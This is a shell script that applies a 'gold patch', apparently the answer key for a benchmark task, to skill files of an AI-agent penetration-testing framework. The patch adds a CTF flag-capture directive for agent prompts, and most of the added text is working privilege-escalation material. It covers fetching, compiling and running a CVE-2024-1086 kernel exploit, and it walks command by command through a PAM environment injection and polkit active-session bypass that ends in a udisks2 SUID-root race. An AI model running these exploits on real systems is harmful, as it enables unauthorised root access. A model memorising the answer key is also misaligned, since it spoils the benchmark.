#!/usr/bin/env bash
set -euo pipefail

cd /workspace/red-run

# Idempotency guard
if grep -qF "| vuln w/ \"FLAG:\" in summary | Always \u2014 immediate | Notify operator with promine" "skills/orchestrator/SKILL.md" && grep -qF "| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active se" "skills/privesc/linux-discovery/SKILL.md" && grep -qF "| \"failed to detect overwritten pte\" | PTE spray didn't land | Race condition \u2014 " "skills/privesc/linux-kernel-exploits/SKILL.md" && grep -qF "3. Polkit policies with `allow_active=yes` now grant access without authenticati" "skills/privesc/linux-sudo-suid-capabilities/SKILL.md"; then
  echo "Gold patch already applied."
  exit 0
fi

git apply --whitespace=nowarn <<'PATCH'
diff --git a/skills/orchestrator/SKILL.md b/skills/orchestrator/SKILL.md
@@ -529,6 +529,7 @@ When the watcher fires, read the JSON output and evaluate each event:
 
 | Event Type | Actionable? | Follow-up Action |
 |------------|-------------|-----------------|
+| vuln w/ "FLAG:" in summary | Always — immediate | Notify operator with prominent callout (see Flag Capture section). Do not interrupt running agent. |
 | credential | Always | Authenticated enumeration or spray against services |
 | vuln (high/critical) | When a technique skill exists | Spawn technique agent |
 | vuln (medium/low/info) | Display only | Note for later |
@@ -1083,6 +1084,70 @@ Common chains that produce shell access on a host:
 > configs, databases), follow the File Exfiltration decision tree in the skill
 > template — prefer direct download (HTTP, SCP, SMB) over base64 encoding.
 
+### Flag Capture (CTF Speed Priority)
+
+**First blood wins.** When spawning any agent that has shell access on a
+target — discovery, privesc, or technique — append the **flag capture
+directive** to the agent prompt. This is an orchestrator-injected instruction,
+not part of any skill or agent definition.
+
+**When to append the directive:**
+- Every host discovery spawn (linux-discovery, windows-discovery)
+- Every privesc technique spawn (sudo/SUID, token impersonation, kernel, etc.)
+- Every post-exploitation spawn that runs commands on a host
+- Any agent that gains NEW access as part of its skill (e.g., file-upload-bypass
+  produces a web shell, kerberos-delegation produces a DA ticket + shell)
+
+**Do NOT append for:** network-recon, web-discovery, ad-discovery, password-
+spraying, credential-cracking, evasion — these don't have shell access on a
+target host.
+
+**The directive** (append verbatim to the agent prompt, substituting variables):
+
+```
+FLAG CAPTURE (do this FIRST, before enumeration):
+Check for flags immediately upon gaining or using shell access. Read these
+paths and report any content found:
+- Linux: /root/root.txt, /root/proof.txt, /home/*/user.txt, /home/*/local.txt
+- Windows: C:\Users\Administrator\Desktop\root.txt, C:\Users\*\Desktop\user.txt, C:\Users\*\Desktop\proof.txt
+If a path is not readable with current privileges, skip it silently.
+For each flag found, IMMEDIATELY call add_vuln with:
+  target=<TARGET_HOST>, title="FLAG: <filename> (<username>)",
+  vuln_type="flag", severity="critical",
+  details="<flag contents>", discovered_by="<your agent name>"
+Then continue with your skill methodology — do not stop or wait.
+```
+
+**Orchestrator handling when a flag event arrives:**
+
+When the event watcher or `poll_events()` surfaces a vuln event where the
+summary contains "FLAG:", immediately notify the operator with a prominent
+callout:
+
+```
+**FLAG CAPTURED on <host>**
+  File: <filename>
+  User: <privilege level>
+  Flag: <contents>
+  Agent: <which agent found it>
+```
+
+Log to `engagement/activity.md`:
+```
+### [YYYY-MM-DD HH:MM:SS] FLAG CAPTURED on <host>
+- File: <filename>, User: <privilege level>
+- Flag: <contents>
+- Found by: <agent name> during <skill name>
+```
+
+Do not interrupt the running agent — it continues enumeration normally. The
+flag is already in state via the agent's interim write.
+
+**Lateral movement and privesc re-check:** After every privilege escalation
+(user → root/SYSTEM/admin), the next agent spawn includes the directive again.
+Higher privileges unlock flag paths that were unreadable before (e.g.,
+`/root/root.txt` after privesc).
+
 **Lateral Movement:**
 - Credentials from one host → test against all others in scope
 - Service account → ad-exploit-agent(`kerberos-roasting`) → more credentials
diff --git a/skills/privesc/linux-discovery/SKILL.md b/skills/privesc/linux-discovery/SKILL.md
@@ -258,6 +258,40 @@ recommending **linux-sudo-suid-capabilities**. Pass: hostname, current user,
 polkit version, pkexec SUID status, accountsservice presence. Do not execute
 exploitation commands inline.
 
+**PAM Environment Injection + Polkit Active Session Bypass:**
+
+On SUSE/openSUSE (and potentially other distros), `pam_env.so` may be configured
+with `user_readenv=1`, allowing users to inject environment variables via
+`~/.pam_environment` that are read *before* `pam_systemd.so` registers the
+session with logind. This enables hijacking session properties to gain
+`Active=yes` status on an SSH session — unlocking all polkit `allow_active`
+policies without authentication.
+
+```bash
+# Check PAM config for user_readenv=1
+grep -r "user_readenv" /etc/pam.d/ 2>/dev/null
+
+# Check current session properties
+loginctl show-session "$XDG_SESSION_ID" 2>/dev/null | grep -E "Active|State|Seat|Type"
+
+# Enumerate polkit actions with allow_active=yes
+pkaction --verbose 2>/dev/null | grep -B5 "allow_active.*yes" | grep -E "^org\.|allow_active"
+```
+
+**What to look for:**
+
+| Finding | Meaning | Route To |
+|---------|---------|----------|
+| `user_readenv=1` in PAM config | Can inject XDG_SEAT/XDG_VTNR via ~/.pam_environment | **linux-sudo-suid-capabilities** |
+| `Active=no` + `user_readenv=1` | SSH session can be upgraded to Active=yes | **linux-sudo-suid-capabilities** |
+| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active session can perform privileged operations without auth | **linux-sudo-suid-capabilities** |
+
+If `user_readenv=1` is found AND polkit actions with `allow_active=yes` exist
+→ STOP. Return to orchestrator recommending **linux-sudo-suid-capabilities**.
+Pass: hostname, current user, PAM config showing user_readenv, loginctl session
+output, list of allow_active polkit actions (especially udisks2 loop-setup,
+filesystem resize/check). Do not execute exploitation commands inline.
+
 ## Step 4: SUID/SGID and Capabilities
 
 ```bash
@@ -655,10 +689,13 @@ Based on enumeration findings, route to the appropriate technique skill:
 `sudo -l` returns usable entries, SUID binaries with GTFOBins matches, sudo version
 vulnerable to CVE-2021-3156 (VERIFIED with `sudoedit -s '\'`) or CVE-2019-14287,
 capabilities on binaries, polkit CVE-2021-4034 (pkexec SUID) or CVE-2021-3560
-(polkit < 0.117 + accountsservice + dbus-send)
+(polkit < 0.117 + accountsservice + dbus-send), PAM `user_readenv=1` with
+polkit `allow_active=yes` on dangerous actions (udisks2 loop-setup/resize,
+systemd reboot/poweroff)
 → STOP. Return to orchestrator recommending **linux-sudo-suid-capabilities**.
   Pass: hostname, current user, specific findings (sudo entries / SUID binaries /
-  capabilities / polkit version and pkexec SUID status), kernel version.
+  capabilities / polkit version and pkexec SUID status / PAM user_readenv +
+  polkit allow_active actions), kernel version.
   Do not execute privilege escalation commands inline.
 
 ### Scheduled Task / Service Vectors Found
diff --git a/skills/privesc/linux-kernel-exploits/SKILL.md b/skills/privesc/linux-kernel-exploits/SKILL.md
@@ -13,6 +13,8 @@ keywords:
   - CVE-2022-0847
   - CVE-2016-5195
   - CVE-2023-0386
+  - CVE-2024-1086
+  - nf_tables use-after-free
   - exploit suggester
   - linux-exploit-suggester
   - rbash escape
@@ -191,7 +193,8 @@ uname -r
 | CVE-2016-5195 | DirtyCow | ≤ 4.8.3 (race condition) | High (but old) |
 | CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11, 5.15.x < 5.15.25 | High |
 | CVE-2023-0386 | OverlayFS (GameOver(lay)) | 5.11 – 6.2 (Ubuntu specific) | High |
-| CVE-2023-32233 | Netfilter nf_tables | 5.x – 6.3.1 | Medium |
+| CVE-2023-32233 | Netfilter nf_tables UAF | 5.x – 6.3.1 | Medium |
+| CVE-2024-1086 | Netfilter nf_tables UAF (v2) | 5.14 – 6.6 | Medium |
 | CVE-2022-2588 | route4 UAF | 5.x – 5.19 | Medium |
 | CVE-2021-4034 | PwnKit (pkexec) | Any with polkit ≤ 0.120 | High (userspace) |
 | CVE-2022-0492 | Cgroup escape | 5.x (container) | Medium |
@@ -512,6 +515,68 @@ chmod +x /tmp/exploit
 ./exploit
 ```
 
+### CVE-2024-1086 — Netfilter nf_tables Use-After-Free (v2)
+
+**Affected:** Linux 5.14 through 6.6 (nf_tables module must be loaded)
+
+This is a newer nf_tables UAF, distinct from CVE-2023-32233. It exploits a
+double-free in `nft_verdict_init()` via user namespaces. More reliable than
+CVE-2023-32233 on newer kernels but requires user namespace support.
+
+**Check vulnerability:**
+
+```bash
+uname -r
+# Must be 5.14.x through 6.6.x
+
+# nf_tables module loaded
+lsmod | grep nf_tables
+
+# User namespaces enabled (required)
+cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
+# Or: sysctl kernel.unprivileged_userns_clone
+
+# Seccomp status (exploit may fail under seccomp)
+grep Seccomp /proc/self/status
+# Seccomp: 0 = no filter (good), 2 = filter active (may block)
+```
+
+**Exploit:**
+
+```bash
+# On attackbox: clone and compile
+git clone https://github.com/Notselwyn/CVE-2024-1086
+cd CVE-2024-1086
+make
+# Binary: exploit
+
+# Transfer to target
+# python3 -m http.server 8080
+# On target: wget http://ATTACKBOX:8080/exploit -O /tmp/exploit_1086
+chmod +x /tmp/exploit_1086
+/tmp/exploit_1086
+```
+
+**Alternative PoC repositories** (if the primary fails):
+- `https://github.com/Notselwyn/CVE-2024-1086` — original researcher's PoC
+- `https://github.com/CCob/CVE-2024-1086` — alternative implementation
+
+**Troubleshooting:**
+
+| Symptom | Cause | Fix |
+|---------|-------|-----|
+| "failed to detect overwritten pte" | PTE spray didn't land | Race condition — retry 3-5 times. Try alternative PoC repos with different spray strategies |
+| "pmd: 00000000cafebabe" | Sentinel value, spray completely missed | Kernel config may differ from what exploit expects. Try alternative PoC |
+| Seccomp blocks syscalls | Shell has seccomp filter (common in PHP-FPM, Docker) | Run from a non-seccomp context (SSH session, not webshell) |
+| "Operation not permitted" on CLONE_NEWUSER | User namespaces disabled | Check `kernel.unprivileged_userns_clone`. If 0, this exploit won't work |
+| Exploit hangs | Race condition timing | Run with `timeout 120 /tmp/exploit_1086`. Kill and retry |
+| Kernel panic/oops | UAF corruption | Inherent risk with UAF exploits. Warn client. May need box reboot |
+
+**Key insight:** This exploit is a race condition. A single failure does NOT mean
+the kernel is patched. Retry 3-5 times before concluding it's blocked. If all
+retries fail with the same PTE error, try an alternative PoC repository — different
+implementations use different spray strategies.
+
 ### CVE-2022-2588 — route4 Use-After-Free
 
 **Affected:** Linux 5.x through 5.19
diff --git a/skills/privesc/linux-sudo-suid-capabilities/SKILL.md b/skills/privesc/linux-sudo-suid-capabilities/SKILL.md
@@ -20,6 +20,13 @@ keywords:
   - CVE-2021-4034
   - pwnkit
   - polkit dbus bypass
+  - pam_environment
+  - user_readenv
+  - polkit allow_active
+  - udisksctl
+  - udisks2 privesc
+  - logind active session
+  - loop-setup nosuid
 tools:
   - GTFOBins reference
   - gcc
@@ -485,6 +492,154 @@ orchestrator with assessment: `blocked — no exec-capable staging directory for
 GCONV_PATH .so`. The orchestrator may route to **linux-kernel-exploits** for
 DirtyCow/DirtyPipe or other vectors that don't require shared library loading.
 
+## Step 4b: PAM Environment Injection + Polkit Active Session Bypass
+
+When `linux-discovery` reports `user_readenv=1` in PAM config and polkit
+`allow_active=yes` on privileged actions, this chain escalates an SSH session to
+perform operations that normally require physical console presence.
+
+### How It Works
+
+1. `pam_env.so` with `user_readenv=1` reads `~/.pam_environment` during the auth
+   stack — *before* `pam_systemd.so` runs in the session stack
+2. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the
+   SSH session as a physical console session (`Active=yes`)
+3. Polkit policies with `allow_active=yes` now grant access without authentication
+4. `udisksctl loop-setup` + `Filesystem.Resize`/`Check` triggers a temporary mount
+   via libblockdev at `/tmp/blockdev.XXXXXX` **without nosuid flags**
+5. A SUID root binary in the mounted filesystem executes with `euid=0`
+
+### Prerequisites
+
+- SSH access as any user
+- `pam_env.so` configured with `user_readenv=1` (default on SUSE/openSUSE)
+- `udisks2` + `libblockdev` installed (default on most desktop-oriented installs)
+- Polkit `allow_active=yes` on udisks2 loop-setup and filesystem operations
+- `xfsprogs` on attackbox (for building the XFS image)
+
+### Step 1: Verify PAM Configuration
+
+```bash
+grep -r "user_readenv" /etc/pam.d/ 2>/dev/null
+# Look for: pam_env.so user_readenv=1
+```
+
+If `user_readenv=1` is NOT present, this technique does not apply.
+
+### Step 2: Inject Session Properties
+
+```bash
+cat > ~/.pam_environment << 'EOF'
+XDG_SEAT OVERRIDE=seat0
+XDG_VTNR OVERRIDE=1
+EOF
+```
+
+**Disconnect the SSH session** (exit), then **reconnect**. The new session will be
+registered as Active.
+
+### Step 3: Verify Active Session
+
+```bash
+loginctl show-session "$XDG_SESSION_ID" | grep -E "Active|State|Seat"
+# Expected: Active=yes, State=active, Seat=seat0
+```
+
+If `Active=no`, check that `~/.pam_environment` was written correctly and that
+you fully disconnected and reconnected (not just opened a new channel on the
+same SSH connection).
+
+### Step 4: Build Malicious Filesystem Image (on attackbox)
+
+Build an XFS image containing a SUID root bash binary. This requires root on the
+attackbox.
+
+```bash
+# Get bash from target for glibc compatibility
+scp user@TARGET:/bin/bash /tmp/target-bash
+
+# Create XFS image
+dd if=/dev/zero of=./suid.image bs=1M count=300
+mkfs.xfs -f ./suid.image
+mkdir -p /tmp/suid-mount
+mount -t xfs ./suid.image /tmp/suid-mount
+cp /tmp/target-bash /tmp/suid-mount/bash
+chown root:root /tmp/suid-mount/bash
+chmod 04555 /tmp/suid-mount/bash
+umount /tmp/suid-mount
+
+# Transfer to target
+scp ./suid.image user@TARGET:~/suid.image
+```
+
+### Step 5: Exploit UDisks2 Nosuid Mount Race
+
+On target (with `Active=yes` session):
+
+```bash
+# Kill gvfs-udisks2-volume-monitor if running (can interfere)
+killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true
+
+# Create loop device (no auth prompt thanks to Active=yes)
+udisksctl loop-setup --file ~/suid.image --no-user-interaction
+# Note the device path (e.g., /dev/loop0)
+
+# Start background catcher — races to exec SUID bash from temp mount
+(while true; do
+  for d in /tmp/blockdev*/; do
+    [ -x "${d}bash" ] && exec "${d}bash" -p -c 'echo "[+] GOT ROOT"; id; exec bash -p'
+  done
+  sleep 0.01
+done) &
+CATCHER_PID=$!
+
+# Trigger nosuid-less temporary mount via XFS resize
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+  --method org.freedesktop.UDisks2.Filesystem.Resize 0 'a{sv}'
+
+# If Resize errors, try Check instead:
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+  --method org.freedesktop.UDisks2.Filesystem.Check 'a{sv}'
+
+# Wait and check
+sleep 2
+ls -la /tmp/blockdev*/bash 2>/dev/null
+
+# Execute SUID bash directly if catcher didn't fire
+/tmp/blockdev*/bash -p
+# Expected: euid=0(root)
+```
+
+**The `-p` flag is critical** — without it, bash drops the elevated euid.
+
+### Troubleshooting
+
+- **"Not authorized" from udisksctl**: `Active=yes` didn't take effect. Verify
+  with `loginctl show-session`. Ensure you fully disconnected and reconnected SSH.
+- **Race doesn't land**: The mount window is milliseconds. Retry 3-5 times. Kill
+  the catcher (`kill $CATCHER_PID`), delete the loop device (`udisksctl
+  loop-delete --block-device /dev/loop0 --no-user-interaction`), and repeat from
+  loop-setup.
+- **Loop device is loop1/loop2**: Adjust the gdbus object path to match (e.g.,
+  `/org/freedesktop/UDisks2/block_devices/loop1`).
+- **No /tmp/blockdev* appears**: libblockdev may use a different temp path. Check
+  `/proc/mounts` while triggering Resize/Check. A compiled C catcher monitoring
+  `/proc/mounts` in a tight loop is more reliable than the bash approach.
+- **udisksctl not found**: udisks2 not installed. This technique does not apply.
+
+### Cleanup
+
+```bash
+rm ~/.pam_environment
+kill $CATCHER_PID 2>/dev/null
+udisksctl loop-delete --block-device /dev/loop0 --no-user-interaction 2>/dev/null
+rm ~/suid.image
+```
+
 ## Step 5: SUID Binary Exploitation
 
 ### Enumeration
PATCH

echo "Gold patch applied."
